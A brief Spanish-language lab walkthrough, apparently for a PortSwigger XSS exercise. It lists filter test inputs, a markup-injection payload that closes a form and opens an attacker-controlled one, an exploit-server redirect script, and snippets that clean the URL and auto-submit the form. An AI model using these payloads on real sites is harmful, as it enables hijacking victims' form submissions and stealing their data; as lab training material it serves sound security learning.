___
- tags: #xss #portswigger  #burpsuite_pro
___
## Paso a paso
pruebo pasar por input distintas pruebas para ver que es inyectable y que no.

### Pruebas de inputs
```txt

# me lo permite
prueba">

# me lo permite, pero dice que viola las políticas de seguridad y se bloquea la ejecución
prueba"><script>alert(0)</script>
```

### Intentamos cerrar y abrir un formulario
```html
	prueba"></form><form class="login_form" name="wua" action="rul de lsitio" method="GET"><button class="button" type="submit">Click me</button';
```
### Lo enviamos por el servidor de ataque
en el body
```html
<script>
location="url completa";
</script>
```

## Utilidades
### Para limpiar la URL
```javascript
history.pushState('','','/')
```

### Para forzar se aprete el botón de submit
```javascript
//obtengo el primer forumulario (el único que estoy enviando) y le digo que ejecute submit 
document.forms[0].submit();
```